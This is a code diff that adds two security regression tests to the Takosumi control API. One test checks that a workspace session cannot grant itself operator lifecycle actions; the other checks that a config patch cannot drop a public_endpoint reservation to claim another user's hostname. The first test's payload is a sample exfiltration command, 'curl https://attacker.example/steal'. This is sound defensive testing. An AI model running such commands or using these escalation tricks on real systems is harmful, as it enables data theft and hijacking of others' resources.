@@ -215,6 +215,133 @@ async function controlJson<T>(
   return (await response!.json()) as T;
 }
 
+test("a Workspace session cannot grant itself operator lifecycle actions through the Capsule config patch", async () => {
+  const accountStore = new InMemoryAccountsStore();
+  const cookie = seedSession(accountStore);
+  const deployStore = new InMemoryOpenTofuControlStore();
+  const { operations } = await createTakosumiService({
+    role: "takosumi-api",
+    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
+    opentofuControlStore: deployStore,
+  });
+  const seeded = await seedCapsuleModel(deployStore, {
+    workspaceId: "ws_lifecycle_escalation",
+    capsuleId: "cap_lifecycle_esc",
+    installConfigId: "icfg_lifecycle00001",
+    installConfig: {
+      workspaceId: "ws_lifecycle_escalation",
+      internal: { reason: "per_install_overrides" },
+      policy: {
+        lifecycleActions: {
+          allowedExecutors: ["runner"],
+          allowedRunnerCapabilities: ["capsule.lifecycle.command.v1"],
+        },
+      },
+    },
+  });
+
+  // PATCH /api/v1/capsule-configs/:id is gated only by active Workspace
+  // membership, and an `operator` action is executed by the operator's own
+  // release-activation webhook. Widening the policy in the same patch that
+  // installs the action must not be self-authorizing.
+  const built = request(
+    "PATCH",
+    `/api/v1/capsule-configs/${seeded.installConfig.id}`,
+    {
+      cookie,
+      body: {
+        lifecycleActions: [
+          {
+            apiVersion: "takosumi.dev/v1alpha1",
+            kind: "command",
+            id: "activate",
+            phase: "post_apply",
+            executor: "operator",
+            command: ["curl", "https://attacker.example/steal"],
+            runnerCapability: "capsule.lifecycle.command.v1",
+          },
+        ],
+        lifecycleActionPolicy: {
+          allowedExecutors: ["runner", "operator"],
+          allowedRunnerCapabilities: ["capsule.lifecycle.command.v1"],
+        },
+      },
+    },
+  );
+  const response = await handleControlRoute({
+    request: built.request,
+    url: built.url,
+    store: accountStore,
+    operations,
+  });
+
+  expect(response?.status).toEqual(403);
+  const stored = await operations.capsules.getInstallConfig(
+    seeded.installConfig.id,
+  );
+  expect(stored.lifecycleActions).toBeUndefined();
+  expect(stored.policy.lifecycleActions?.allowedExecutors).toEqual(["runner"]);
+});
+
+test("a Capsule config patch cannot drop the public_endpoint projection that reserves the hostname", async () => {
+  const accountStore = new InMemoryAccountsStore();
+  const cookie = seedSession(accountStore);
+  const deployStore = new InMemoryOpenTofuControlStore();
+  const { operations } = await createTakosumiService({
+    role: "takosumi-api",
+    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
+    opentofuControlStore: deployStore,
+  });
+  const seeded = await seedCapsuleModel(deployStore, {
+    workspaceId: "ws_public_endpoint",
+    capsuleId: "cap_public_endpoint",
+    installConfigId: "icfg_publicendpoint",
+    installConfig: {
+      workspaceId: "ws_public_endpoint",
+      internal: { reason: "per_install_overrides" },
+      variableMapping: { app_url: "https://mine.app.takosumi.test" },
+      installExperience: {
+        projections: [
+          {
+            kind: "public_endpoint",
+            variables: { url: "app_url" },
+          },
+        ],
+      },
+    },
+  });
+
+  // Erasing the projection while keeping the endpoint variable would make the
+  // plan skip host reservation entirely and let `app_url` name someone else's
+  // host — `installExperienceValue({})` parses, so this must be rejected here.
+  const built = request(
+    "PATCH",
+    `/api/v1/capsule-configs/${seeded.installConfig.id}`,
+    {
+      cookie,
+      body: {
+        installExperience: {},
+        variableMapping: { app_url: "https://victim.app.takosumi.test" },
+      },
+    },
+  );
+  const response = await handleControlRoute({
+    request: built.request,
+    url: built.url,
+    store: accountStore,
+    operations,
+  });
+
+  expect(response?.status).toEqual(400);
+  const stored = await operations.capsules.getInstallConfig(
+    seeded.installConfig.id,
+  );
+  expect(stored.installExperience?.projections).toEqual([
+    { kind: "public_endpoint", variables: { url: "app_url" } },
+  ]);
+  expect(stored.variableMapping.app_url).toBe("https://mine.app.takosumi.test");
+});
+
 test("account session control routes execute plan and apply through the real OpenTofu controller", async () => {
   const accountStore = new InMemoryAccountsStore();
   const cookie = seedSession(accountStore);
